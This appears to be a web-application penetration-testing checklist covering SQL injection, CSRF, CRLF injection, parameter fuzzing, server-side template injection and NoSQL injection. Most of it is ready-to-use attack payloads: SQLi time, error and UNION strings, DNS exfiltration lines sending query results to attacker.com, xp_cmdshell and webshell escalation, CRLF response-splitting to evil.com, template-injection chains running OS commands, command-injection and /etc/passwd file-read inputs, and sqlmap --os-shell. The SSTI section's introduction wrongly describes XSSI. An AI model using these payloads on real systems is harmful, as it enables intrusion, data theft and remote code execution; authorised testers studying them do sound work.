* [ ] Single quote `'` → error / 500 / different response?
* [ ] Double quote `"`
* [ ] Backtick `` ` ``
* [ ] Two singles `''` (re-balance) → page returns to normal?
* [ ] Backslash `\`
* [ ] Math test: `?id=2-1` returns same as `?id=1` (numeric context)
* [ ] Boolean pair: `' AND '1'='1` (true) vs `' AND '1'='2` (false)
* [ ] Numeric boolean: `AND 1=1` vs `AND 1=2`
* [ ] Concatenation tests: `'||'`, `'+'`, `' '` (Oracle/MSSQL/MySQL differ)
* [ ] Comment terminators: `-- -`, `#`, `/*`, `;%00`

***

### 3. Identify Context & DBMS

* [ ] Determine context: numeric / single-quote string / double-quote / LIKE `%...%` / IN () / ORDER BY
* [ ] Fingerprint via error messages
* [ ] Version strings: `@@version` (MySQL/MSSQL), `version()` (PG/MySQL), `banner` (Oracle)
* [ ] Concatenation behavior: `CONCAT()` (MySQL) / `||` (PG/Oracle) / `+` (MSSQL)
* [ ] Comment style: `-- -` / `#` (MySQL) / `--` (PG/MSSQL/Oracle)
* [ ] String funcs: `SUBSTRING`/`SUBSTR`/`MID`, `SLEEP`/`pg_sleep`/`WAITFOR`/`dbms_pipe`

***

### 4. UNION-Based

* [ ] Find column count via `ORDER BY 1..N` until error
* [ ] Find column count via `UNION SELECT NULL,NULL,...`
* [ ] Identify which columns are reflected (string-compatible): `UNION SELECT 'a',NULL,..`
* [ ] Dump version into a visible column
* [ ] Enumerate DBs: `information_schema.schemata`
* [ ] Enumerate tables: `information_schema.tables`
* [ ] Enumerate columns: `information_schema.columns`
* [ ] Dump creds/PII from target tables
* [ ] Oracle: append `FROM dual`; MSSQL: column type-match matters

***

### 5. Boolean-Based Blind

* [ ] Confirm true/false divergence with `AND 1=1` / `AND 1=2`
* [ ] Extract length: `AND LENGTH(database())=N`
* [ ] Char-by-char: `AND SUBSTRING(database(),1,1)='a'`
* [ ] Binary search with `ASCII()`/`>`/`<` to speed extraction
* [ ] Use `LIKE` divergence (e.g. comment-hiding trick on Pornhub-style filters)

***

### 6. Error-Based

* [ ] MySQL `extractvalue(1,concat(0x7e,(SELECT @@version)))`
* [ ] MySQL `updatexml(1,concat(0x7e,(SELECT database())),1)`
* [ ] MySQL double-query / `floor(rand()*2)` group-by error
* [ ] MSSQL `CONVERT(int,(SELECT @@version))` / `CAST`
* [ ] PostgreSQL `CAST((SELECT version()) AS int)`
* [ ] Oracle `CTXSYS.DRITHSX.SN` / `utl_inaddr.get_host_name`

***

### 7. Time-Based Blind (payload bank)

* [ ] MySQL `SLEEP(5)#` and `' or sleep(5)#` (and `"`, `)`, `))`, `')`, `")` variants)
* [ ] MySQL stacked subselect: `AND (SELECT * FROM (SELECT(SLEEP(5)))a)`
* [ ] MySQL `'XOR(if(now()=sysdate(),sleep(5),0))OR'`
* [ ] MySQL `benchmark(10000000,MD5(1))#`
* [ ] PostgreSQL `pg_sleep(5)--` (and quote/paren variants)
* [ ] MSSQL `;waitfor delay '0:0:5'--` (and `'`, `"`, `)` variants)
* [ ] SQLite heavy query: `AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))`
* [ ] `ORDER BY SLEEP(5)` / `'&&SLEEP(5)&&'1` context variants
* [ ] Confirm timing is consistent (run baseline + repeat to rule out jitter)

***

### 8. Stacked Queries & OOB (out-of-band)

* [ ] Stacked query support: `; SELECT ...` / `;WAITFOR DELAY` (MSSQL, PG)
* [ ] DNS exfil — MySQL `LOAD_FILE(CONCAT('\\\\',(query),'.attacker.com\\x'))`
* [ ] DNS exfil — MSSQL `master..xp_dirtree '\\(query).attacker.com\x'`
* [ ] DNS exfil — Oracle `UTL_HTTP` / `UTL_INADDR` / `DBMS_LDAP`
* [ ] PostgreSQL OOB via `dblink` / `COPY ... TO PROGRAM` (if superuser)
* [ ] Burp Collaborator / interactsh as the listener

***

### 9. Second-Order

* [ ] Identify input stored now, used in a query later (registration username, profile field)
* [ ] Plant payload on store endpoint, trigger on the consuming endpoint
* [ ] sqlmap `--second-order=<url>` (or `--second-req`) to automate the trigger
* [ ] Watch for payloads firing in admin/reporting/export views

***

### 10. PostgreSQL-Specific

* [ ] `version()`, `current_database()`, `current_user`
* [ ] String concat with `||`; cast errors via `::int`
* [ ] Time: `pg_sleep(5)`; heavy: `generate_series`
* [ ] `COPY (SELECT ...) TO PROGRAM '...'` → RCE if superuser (CVE-2019-9193 era)
* [ ] `dblink_connect` / `dblink` for OOB & cross-DB
* [ ] Large-object functions (`lo_import`/`lo_export`) for file read/write
* [ ] `current_setting('is_superuser')` to check privilege

***

### 11. Advanced / RCE Escalation

* [ ] MySQL file read: `LOAD_FILE('/etc/passwd')` (needs FILE priv + secure\_file\_priv)
* [ ] MySQL file write: `INTO OUTFILE`/`DUMPFILE` → webshell in webroot
* [ ] MSSQL `xp_cmdshell` (enable via `sp_configure`) → OS command
* [ ] MSSQL linked servers / `OPENQUERY`
* [ ] Oracle `DBMS_SCHEDULER`/`DBMS_JAVA` for command exec
* [ ] Read DB creds → pivot / reuse elsewhere
* [ ] Signature/HMAC bypass on signed params (Razer easy2pay-style) before injecting

***

### 12. WAF / Filter Bypass

* [ ] Inline comments: `/*!50000SELECT*/`, `SE/**/LECT`
* [ ] Case toggling: `SeLeCt`, `UnIoN`
* [ ] Whitespace alts: `%09`, `%0a`, `%0c`, `%a0`, `/**/`, `+`
* [ ] Encoding: URL, double-URL, unicode, hex (`0x...`), char() concat
* [ ] Keyword splitting / nesting: `UNIONUNION SELECTSELECT`
* [ ] Alternate operators: `||`, `&&`, `LIKE`, `RLIKE`, `REGEXP` instead of `=`
* [ ] Logical equivalents: `AND 1` , `AND true()`, `AND 2>1`
* [ ] sqlmap `--tamper` (space2comment, between, charencode, randomcase, etc.)
* [ ] Cookie / header injection point to dodge URL-focused WAF rules

***

### 13. Automation (sqlmap)

* [ ] `sqlmap -r request.txt --batch` (use a saved proxy request)
* [ ] `--level=5 --risk=3` for deeper tests
* [ ] `--dbms=` to pin the DBMS once known
* [ ] `--technique=BEUSTQ` to control which methods run
* [ ] `--dbs` → `--tables` → `--columns` → `--dump`
* [ ] `--tamper=` chain for WAF bypass
* [ ] `--second-order=<url>` for stored injection
* [ ] `--os-shell` / `--sql-shell` for exploitation
* [ ] Headers/cookie: mark injection point with `*` and `--cookie`/`-H`

***

### 14. Confirm Impact

* [ ] Data exfiltration (creds, PII, financials)
* [ ] Authentication bypass (login as user/admin)
* [ ] Privilege escalation within the DB
* [ ] File read/write
* [ ] RCE (xp\_cmdshell / OUTFILE webshell / COPY TO PROGRAM)
* [ ] Re-verify on a clean request; record exact param, context, and DBMS
* [ ] Note whether unauthenticated or auth-required (impact + severity)

</details>

<details>

<summary>CSRF</summary>

> Run these boxes against a state-changing request. Order: confirm it's a CSRF candidate → probe each defense → bypass tokens/headers/SameSite → JSON/content-type tricks → chain → impact. Test with a valid session in one browser and the forged request from another origin.

### 0. Is This a CSRF Candidate?

* [ ] Request changes state (settings, password, email, payment, role, delete, logout)
* [ ] Request relies only on cookies for auth (no custom header / no token enforced)
* [ ] Response isn't needed by attacker (blind state change is enough)
* [ ] Cookies sent cross-site? Check `SameSite` attribute (None/Lax/Strict)
* [ ] Identify the protection in use: token / SameSite / JSON CT / re-auth / double-submit / Origin-Referer / captcha / custom header

***

### 1. Where to Look

* [ ] Auth-required actions (settings, password, email)
* [ ] Profile changes (email, personal info, picture)
* [ ] Account deletion / suspension
* [ ] Payment / transactional (add card, transfer, subscription)
* [ ] Form submissions (support tickets, feedback, content)
* [ ] Security settings (enable/disable 2FA, security questions)
* [ ] Privilege escalation (role/permission change)
* [ ] Logout (forced logout CSRF)
* [ ] Password reset flow
* [ ] Third-party / social-account linking (OAuth connect)
* [ ] Like / comment / add-to-cart / balance transfer

***

### 2. No-Token / Missing Validation

* [ ] Remove the CSRF token parameter entirely → still accepted?
* [ ] Send empty token (`csrf_token=`) → still accepted?
* [ ] Delete token AND build auto-submitting `<form>` PoC
* [ ] Brand-new session/account: is token even required on first use?

***

### 3. Token Integrity / Reuse

* [ ] Reuse your own old/static token on a new request
* [ ] If token is fixed per account → make PoC with attacker's old token, change email to victim
* [ ] Replace token with a fake value of the **same length**
* [ ] Use another user's token (is it tied to the session?)
* [ ] Token analysis (Burp): is part static, part dynamic? Send only the static part
* [ ] Try to decrypt/crack the token if it looks like a hash
* [ ] Token in cookie only (not validated against body) → swap it

***

### 4. Double-Submit Cookie Bypass

* [ ] Valid baseline: cookie token == body token
* [ ] Set BOTH cookie and body to the same **arbitrary** value (`not_a_real_token`) → accepted?
* [ ] Inject the CSRF cookie via another vuln (header injection / subdomain) then match it in body

***

### 5. Method & Content-Type Tricks

* [ ] Change POST → GET (`/password_change?new_password=abc`)
* [ ] Method override: `_method=POST` / `X-HTTP-Method-Override`
* [ ] JSON CT → `application/x-www-form-urlencoded` (`phone=...`)
* [ ] JSON CT → `text/plain` (`phone=...`)
* [ ] JSON CT → keep `application/json` but send via form with `enctype="text/plain"` padding trick (`name='{"phone":"...","a":"' value='"}'`)
* [ ] Drop Content-Type entirely

***

### 6. Origin / Referer Header Bypass

* [ ] Remove Referer with `<meta name="referrer" content="no-referrer">`
* [ ] Referer suffix trick: `Referer: example.com.attacker.com` (substring check)
* [ ] Referer prefix trick: `Referer: attacker.com/example.com`
* [ ] Send no Origin header (cross-origin GET / downgrade)
* [ ] Check if validation only fires _when header present_ → omit it

***

### 7. SameSite Bypass

* [ ] SameSite=Lax → use a top-level GET navigation (it's allowed)
* [ ] Method downgrade (POST→GET) to ride Lax allowance
* [ ] Sister/sub-domain request (same-site, different origin) to satisfy Lax/Strict
* [ ] Cookie refresh window: trigger a flow that re-issues cookie without SameSite
* [ ] No SameSite set + old browser → treated as None

***

### 8. Chaining

* [ ] Steal CSRF token via XSS, then submit forged request
* [ ] Subdomain takeover + CORS → read token cross-origin
* [ ] CORS misconfig → fetch token from authed endpoint
* [ ] Domain-confusion (parser differences) → ATO
* [ ] OAuth `state` parameter: null byte `%00`, remove, or reuse → linking CSRF → ATO
* [ ] Clickjacking when no token (frame the action page)
* [ ] GraphQL endpoint without CSRF protection (site-wide)

***

### 9. User-Agent / Client Bypass

* [ ] Switch to mobile/tablet User-Agent → token check skipped?
* [ ] Native-app / API client path may not enforce token

***

### 10. Build & Verify PoC

* [ ] Auto-submitting `<form>` for `x-www-form-urlencoded`
* [ ] `enctype="text/plain"` form for JSON endpoints
* [ ] `history.pushState` to spoof a clean/expected path
* [ ] Clickjacking iframe page (when applicable)
* [ ] Fire from a different origin, logged in as victim in another tab
* [ ] Confirm the state actually changed on the victim account

***

### 11. Confirm Impact

* [ ] Account takeover (email/password change)
* [ ] 2FA disable via CSRF
* [ ] Social-account link → ATO
* [ ] Payment/balance/subscription change
* [ ] Account deletion / forced logout
* [ ] Privilege escalation
* [ ] CSRF → stored XSS / HTML injection chain
* [ ] Re-verify on clean session; note which defense was absent/bypassed

</details>

<details>

<summary>CRLF</summary>

> Run these boxes against any input reflected into a response **header** (Location, Set-Cookie, custom headers), a redirect, a log sink, or anything that builds an HTTP request/cache key from user data. CR = `%0D` (`\r`), LF = `%0A` (`\n`). The core test: inject `%0d%0a` and see if you can start a new header; inject `%0d%0a%0d%0a` and see if you can start the body. Tag each probe so you can grep which input split.

***

### 0. Find Injection Points

* [ ] Params reflected into `Location:` (redirects: `?url=`, `?next=`, `?redirect=`, `?返回`)
* [ ] Params reflected into `Set-Cookie:` (lang, region, tracking)
* [ ] Params reflected into any custom response header (`X-*`)
* [ ] Values written to logs (then check log-poisoning)
* [ ] Values used to build an outbound request (SSRF/proxy/webhook → request injection)
* [ ] Values used as a cache key / forwarded by a CDN (→ cache poisoning)
* [ ] Test injection in: query params, URL **path**, headers, cookies, body

***

### 1. Detect the Split

* [ ] `%0d%0aSet-Cookie:crlftest=1` → does the cookie appear in the response?
* [ ] `%0d%0aHeader-Test:test` → arbitrary header reflected?
* [ ] `%0d%0aLocation:%20https://evil.com` → redirect injected?
* [ ] Bare LF only: `%0aSet-Cookie:crlftest=1` (some stacks accept LF alone)
* [ ] Bare CR only: `%0dSet-Cookie:crlftest=1`
* [ ] In URL **path**: `/%0d%0aSet-Cookie:crlftest=1`

***

### 2. Inject a Cookie

* [ ] `http://site/%0D%0ASet-Cookie:mycookie=myvalue`
* [ ] Session-fixation: set a known session cookie → log victim into attacker context
* [ ] Overwrite an existing cookie (CSRF-token, lang, feature flag)

***

### 3. HTTP Response Splitting → XSS

* [ ] `?param=Value%0d%0a%0d%0a<script>alert(document.domain)</script>`
* [ ] Full split: `%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E`
* [ ] XSS-filter bypass via injected headers: `%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e`
* [ ] Path-based: `/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C/script%3E`
* [ ] Starbucks-style path: `/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E`

***

### 4. Write Arbitrary HTML / Phishing

* [ ] Inject full fake response body: `...%0AContent-Type%3A%20text/html%0A...%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E`
* [ ] Confirm content renders in the target's origin

***

### 5. CRLF + Open Redirect (chained)

* [ ] `//www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2`
* [ ] `/www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2`
* [ ] `/google.com/%2F..%0D%0AHeader-Test:test2`
* [ ] `/%0d%0aLocation:%20http://example.com`

***

### 6. HTTP Header Injection → CORS / SOP Bypass

* [ ] Inject `%0d%0aAccess-Control-Allow-Origin:%20https://evil.com`
* [ ] Add `%0d%0aAccess-Control-Allow-Credentials:%20true` → read protected data cross-origin
* [ ] Steal CSRF token / sensitive data via injected CORS headers

***

### 7. SSRF / HTTP Request Injection via CRLF

* [ ] Inject a whole new request into an outbound client (proxy/webhook)
* [ ] PHP `SoapClient` `user_agent` CRLF gadget → inject headers/body/new request
* [ ] Point injected request at internal service + netcat/Collaborator listener

***

### 8. Header Injection → Request Smuggling / Response-Queue Poisoning

* [ ] Force connection reuse: `GET /%20HTTP/1.1%0d%0aHost:%20target%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1`
* [ ] Malicious-prefix injection (poison next user's request / cache)
* [ ] Response-queue poisoning prefix: `...%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`
* [ ] Confirm via desync behavior (see HTTP request smuggling)

***

### 9. Log Poisoning

* [ ] Inject fake log line: `?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?restrictedaction=edit`
* [ ] Forge trusted-source (localhost) entries to cloak actions
* [ ] If logs are later rendered in an admin panel → stored XSS

***

### 10. Memcache Injection

* [ ] Find user data passed unsanitized into memcache commands (key-value, clear-text protocol)
* [ ] Inject new memcache commands via CRLF → poison cache
* [ ] Desync responses to leak other users' data (Zimbra-style)

***

### 11. Pre-Auth Session File Poisoning (CRLF → Auth Bypass)

* [ ] Find an app that persists a **pre-auth session file** on disk then reloads it
* [ ] Locate a field written to the session store (Basic-Auth value, cookie subfield, login attr)
* [ ] Remove optional/expected cookie segments to force a weaker (unencrypted) code path
* [ ] Inject raw CRLF so the serialized session becomes multi-line, adding trusted keys:
  * [ ] `user=root`
  * [ ] `cp_security_token=/cpsess...`
  * [ ] `tfa_verified=1`
* [ ] Trigger session reload/resume → pre-auth upgrades to authenticated/privileged
* [ ] (Reference pattern: cPanel/WHM CVE-2026-41940)

***

### 12. Filter / WAF Bypass

**UTF-8 overlong / fullwidth:**

* [ ] `%E5%98%8A` = `%0A` (`\u560a`)
* [ ] `%E5%98%8D` = `%0D` (`\u560d`)
* [ ] `%E5%98%BE` = `%3E` `>` , `%E5%98%BC` = `%3C` `<`
* [ ] Payload: `%E5%98%8A%E5%98%8DSet-Cookie:%20test`

**Unicode line terminators (back-end normalizes to `\n`):**

* [ ] `%E2%80%A8` (U+2028 LINE SEPARATOR)
* [ ] `%E2%80%A9` (U+2029 PARAGRAPH SEPARATOR)
* [ ] `%C2%85` (U+0085 NEXT LINE)
* [ ] Combine: `/%0A%E2%80%A8Set-Cookie:%20admin=true`

**Encoding tricks:**

* [ ] Double-encode: `%250d%250a`
* [ ] Mixed: `%0d%0a` vs `%0D%0A` vs `\r\n` literal
* [ ] `%u000a` / `%u000d` (IIS-style)
* [ ] Duplicate `Content-Encoding: identity` trick → force browser to render injected HTML:
  * [ ] `%0d%0aContent-Encoding:%20identity%0d%0aContent-Length:%2030%0d%0a`

***

### 13. Known CVE Patterns (library-level, internal services)

* [ ] RestSharp `AddHeader()` no CR/LF sanitize (CVE-2024-45302) → SSRF/smuggling
* [ ] Refit header attributes copied verbatim (CVE-2024-51501)
* [ ] Apache APISIX Dashboard `redirect` → `Location:` (GHSA-4h3j-f5x9-r6x3)
* [ ] Test any internal component that sets headers / makes HTTP requests

***

### 14. Tooling

* [ ] CRLFsuite (active scanner)
* [ ] crlfuzz (wordlist fuzzer, supports Unicode newlines)
* [ ] crlfix (patches Go-generated requests, standalone internal-service testing)
* [ ] carlospolop Auto\_Wordlists `crlf.txt` (brute-force detection list)
* [ ] Burp: inject in Repeater, watch for split headers in response

***

### 15. Confirm Impact

* [ ] Reflected/Stored XSS via response splitting
* [ ] Cookie injection / session fixation
* [ ] Open redirect (chained)
* [ ] CORS bypass → sensitive data / CSRF-token theft
* [ ] SSRF / internal request injection
* [ ] Request smuggling / response-queue poisoning (affects other users)
* [ ] Web cache poisoning (cross-user)
* [ ] Log forging
* [ ] Auth bypass (session-file poisoning)
* [ ] Re-verify on a clean request; note exact param, sink header, and decode layer that allowed the split

</details>

<details>

<summary>Parameters Manual Testing </summary>

**Manual Testing**

*   **XSS**

    ```python
    <img src=x onerror=alert("XSS_By_h0tak88r")> 
    <00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/ 
    jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e
    ```
*   **Open Redirect** → **SSRF**

    <pre class="language-python" data-overflow="wrap"><code class="lang-python">www.whitelisted.com
    www.whitelisted.com.evil.com
    https://google.com
    //google.com
    javascript:alert(1)
    https://evil.com
    https://hackerone.com/reports/59372 -> Homograph Attack
    </code></pre>
* **CSTI**

```javascript
{{7*7}}[7*7]→ {{3*3}}
{{constructor.constructor('alert(document.cookie)')()}}
```

* **SSTI** → `{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}${{<%[%'"}}%\\` → **RCE**
*   **Command Injection →**

    ```python
    1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
    /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
    ```
*   **CRLF →**

    ```jsx
    %0d%0aLocation:%20http://attacker.com

    %3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

    %3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E

    %0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
    ```
* **Dangled Markup \[ HTML Injection ] →** `<br>lol<b><h1>THIS IS AND INJECTED TITLE </h1>`
*   **Local File Inclusion**

    ```jsx
    /etc/passwd
    ../../../../../../etc/hosts
    ..\\..\\..\\..\\..\\..\\etc/hosts
    /etc/hostname
    ../../../../../../etc/hosts
    C:/windows/system32/drivers/etc/hosts
    ../../../../../../windows/system32/drivers/etc/hosts
    ..\\..\\..\\..\\..\\..\\windows/system32/drivers/etc/hosts
    <http://asdasdasdasd.burpcollab.com/mal.php>
    \\\\asdasdasdasd.burpcollab.com/mal.php
    ```
*   **ReDOS**

    ```python
    (\\\\w*)+$
    ([a-zA-Z]+)*$
    ((a+)+)+$
    ```
*   **Server Side Inclusion/Edge Side Inclusion**

    ```python
    <!--#echo var="DATE_LOCAL" --><!--#exec cmd="ls" --><esi:include src=http://evil.com/>x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>
    ```
*   **XSLT Server Side Injection**

    ```python
    <xsl:value-of select="system-property('xsl:version')" /><esi:include src="<http://10.10.10.10/data/news.xml>" stylesheet="<http://10.10.10.10//news_template.xsl>"></esi:include>
    ```
* **Request smuggling** -> [ATO via request smuggling](https://gist.github.com/h0tak88r/8e6f8ff1f1ec511c57ff2063595f49fb#file-request-smuggling-to-ato)
* **SQL Injection**

```python
Bug : Blind SQL Injection Tips : X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
```

</details>

<details>

<summary>SSTI</summary>

> Run these boxes against endpoints that return JS/JSON while relying on cookies (ambient authority). Core idea: `<script src>` is exempt from SOP, so an attacker page can include a victim-authenticated script/JSONP response cross-origin and read the data it exposes. Order: find dynamic/JS-ish endpoints → classify the XSSI type → leak (global var / JSONP / prototype / non-script) → encoding tricks → impact.

### 0. Find Candidate Sinks

* [ ] Anywhere user input is **rendered**, not just echoed: names in emails/greetings, profile fields, templates users can customize
* [ ] URL params, POST body, headers, cookies reflected into a generated page
* [ ] Features that let privileged users edit/submit templates (by-design SSTI)
* [ ] OAuth/SAML params, filename templates, notification/preview features
* [ ] PDF/report generators, email-template builders, "preview" endpoints
* [ ] Wherever you found XSS — re-test it for SSTI (often confused)

***

### 1. Detect (is it evaluated?)

* [ ] **Polyglot fuzz** (triggers error if vulnerable): `${{<%[%'"}}%\`
* [ ] Extended polyglot: `}}{{7*7}}` , `{{7*7}}` , `${7*7}` , `<%= 7*7 %>` , `#{7*7}` , `*{7*7}` , `@(7*7)`
* [ ] Math test — does `{{7*7}}` return **49** (rendered) vs literal `{{7*7}}` (not vuln)?
* [ ] **Rendered** technique: output reflects evaluated result → read it directly
* [ ] **Error-based** technique: verbose error reveals engine + evaluated result
* [ ] **Blind/Boolean** technique: pair a valid-math payload vs a syntax-error payload, compare responses (use ≥2 pairs to avoid false positives)
* [ ] **Time-based** (blind): inject a sleep-style expression and measure delay
* [ ] Spot subtle signals: payload NOT reflected when expected, or chars missing from response

***

### 2. Fingerprint the Engine (decision tree)

* [ ] `{{7*7}}` → 49 → **Jinja2 / Twig** (Python/PHP) family
* [ ] `${7*7}` → 49 → **Smarty / Mako / Freemarker / Thymeleaf** family
* [ ] `{{7*'7'}}` → `7777777` → **Jinja2 (Python)** ; `49` → **Twig (PHP)**
* [ ] `<%= 7*7 %>` → 49 → **ERB (Ruby)** / EJS-style
* [ ] `#{7*7}` → 49 → **Ruby Slim / Pug**
* [ ] `[[${7*7}]]` → 49 → **Thymeleaf** (inlining)
* [ ] `{7*7}` / `{=7*7}` → Smarty/others
* [ ] Read stack traces / error strings for the engine name
* [ ] Cross-check with Hackmanit **Template Injection Table** (44 engines) / 0xAwali "template-engines-injection-101"

***

### 3. Enumerate Internal Objects / Context

* [ ] Jinja2: `{% debug %}` to dump context, filters, tests
* [ ] Dump config/secrets: `{{ config }}` , `{{ settings.SECRET_KEY }}` (Django/Flask)
* [ ] Brute-force variables/attrs with SecLists `Fuzzing/template-engines` wordlist
* [ ] Walk the object graph (Python): `{{ ''.__class__ }}` → `{{ ''.__class__.__mro__ }}` → `__subclasses__()`

***

### 4. RCE / File Read — Jinja2 (Python)

* [ ] Confirm: `{{7*7}}` and `{{7*'7'}}` → `7777777`
*   [ ] MRO → subclasses → os module:

    ```
    {{ ''.__class__.__mro__[1].__subclasses__() }}
    ```
*   [ ] Via cycler/joiner/namespace globals:

    ```
    {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
    {{ cycler.__init__.__globals__.os.popen('id').read() }}
    ```
* [ ] `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`
* [ ] `{% import os %}{{ os.system('id') }}` (code context)
* [ ] Quote-filtered? use `chr()` to build strings, or `request`/`|attr()` tricks

***

### 5. RCE / File Read — Other Engines

* [ ] **Twig (PHP):** `{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}` ; `{{['id']|filter('system')}}`
* [ ] **Freemarker (Java):** `<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }`
* [ ] **Velocity (Java):** `#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod(...)...`
* [ ] **SpringEL / Thymeleaf:** `${T(java.lang.Runtime).getRuntime().exec('calc')}`
* [ ] **OGNL:** `${#rt=@java.lang.Runtime@getRuntime(),#rt.exec("calc")}`
* [ ] **ERB (Ruby):** `<%= system("id") %>` / `<%=` id `%>` / `<%= IO.popen('id').read %>`
* [ ] **Slim (Ruby):** `#{` id `}`
* [ ] **Mako (Python):** `${self.module.cache.util.os.popen('id').read()}` / `<%import os%>${os.popen('id').read()}`
* [ ] **Smarty (PHP):** `{system('id')}` / `{php}...{/php}`
* [ ] **Go text/template:** `{{ .System "id" }}` (if object exposes a System method — needs source)
* [ ] **Razor (.NET):** `@{ System.Diagnostics.Process.Start("cmd","/c id"); }`
* [ ] **Pebble / Jinjava / Nunjucks / Handlebars:** engine-specific gadget chains (see PayloadsAllTheThings)

***

### 6. WAF / Filter Bypass

* [ ] Bracket access instead of dot: `request['application']['__globals__']`
* [ ] `|attr()` filter to dodge `.` blacklist (Jinja2): `''|attr('__class__')`
* [ ] Build blocked strings with `chr()` / concatenation / `~` (Jinja2 concat)
* [ ] Hex/unicode-encode the payload in the URL
* [ ] Split keywords across template constructs
* [ ] String slicing to assemble `os`, `popen`, `system`
* [ ] Auto-escape on? find a non-string path or use engine features that avoid quotes

***

### 7. Tooling

* [ ] **SSTImap** — `python3 sstimap.py -u <url> --os-cmd 'id'` (engine via `--engine`, POST via `--method`/`--data`/`--marker`)
* [ ] **tinja** — `tinja url -u "http://site/?name=x"` (novel polyglots, SSTI+CSTI)
* [ ] **tplmap** — `python2.7 tplmap.py -u 'http://site/?name=John*' --os-shell`
* [ ] Hackmanit Template Injection Table (manual engine ID)
* [ ] SecLists `Fuzzing/template-engines` wordlist
* [ ] Note: some tools need a 2nd request/function call to see the eval (output not directly reflected)

***

### 8. Confirm Impact

* [ ] Remote Code Execution (most common end-goal)
* [ ] Arbitrary file read (`/etc/passwd`, app source, secrets)
* [ ] Secret/config disclosure (`SECRET_KEY`, env vars) → sign tokens / escalate
* [ ] SSRF / internal access via engine HTTP features
* [ ] Sandbox escape (if engine runs sandboxed)
* [ ] Re-verify on a clean request; document the engine, the sink (which param/feature), and whether rendered/error/blind

</details>

<details>

<summary>NoSQL Injection</summary>

> Run these boxes against any input feeding a NoSQL backend (MongoDB most common). Two families: **syntax injection** (break the query string, SQLi-style) and **operator injection** (smuggle JSON operators like `$ne`, `$gt`, `$regex`, `$where`). Core tells: `[$ne]=1` / `{"$gt":""}` changing behavior, or a `$where` JS expression evaluating. Order: find sink → fuzz/detect → syntax → operator → auth bypass → blind extraction → JS exec/RCE → GraphQL → tooling → impact.

### 0. Find Candidate Sinks & Recon

* [ ] Login / auth forms (username + password)
* [ ] Search, filter, sort, lookup-by-field endpoints
* [ ] Any param reflected into a `find()` / query selector
* [ ] JSON request bodies (operators inject cleanly here)
* [ ] URL params in PHP/Express (array syntax `param[$ne]=x` works)
* [ ] Identify the backend if possible (MongoDB, CouchDB, Cassandra, Redis) — payloads differ

***

### 1. Detect (fuzz first)

* [ ] Fuzz string: `'"`{ ;$Foo}$Foo \xYZ\` → error / behavior change?
* [ ] Single char `'` → observe syntax interpretation
* [ ] Inject `'` `"` `\` `;` `{` `}` individually
* [ ] Boolean pair — False: `' && 0 && 'x` vs True: `' && 1 && 'x`
* [ ] Always-true override: `'%27%7c%7c%31%7c%7c%27` (`'||1||'`)
* [ ] Mongo-style: `' || 1==1//` , `' || 1==1%00` , `admin' || 'a'=='a`
* [ ] Watch for: error message, different result count, or response diff

***

### 2. Syntax Injection (break the query)

* [ ] `' || '1'=='1`
* [ ] `'||1==1//` and `'||1==1%00` (comment/null terminators)
* [ ] `';return true;var x='`
* [ ] `'; return 'a'=='a' && ''=='`
* [ ] `{ $where: "this.credits == this.debits" }` (IF/code execution)
* [ ] Field existence: `admin' && this.password != '` (exists) vs `admin' && this.foo != '` (doesn't)

***

### 3. Operator Injection

> Submit operators via JSON or URL-array syntax (PHP/Express convert `param[$ne]=x` to `{param:{$ne:'x'}}`).

* [ ] `$ne` (not equal): `username[$ne]=1&password[$ne]=1`
* [ ] `$gt` / `$lt`: `username[$ne]=admin&pass[$gt]=s`
* [ ] `$regex`: `username[$regex]=^adm&password[$ne]=1`
* [ ] `$eq`: `username[$eq]=admin&password[$ne]=1`
* [ ] `$exists`: `username[$exists]=true&password[$exists]=true`
* [ ] `$in`: `{"username":{"$in":["admin","root","administrator"]},"password":{"$gt":""}}`
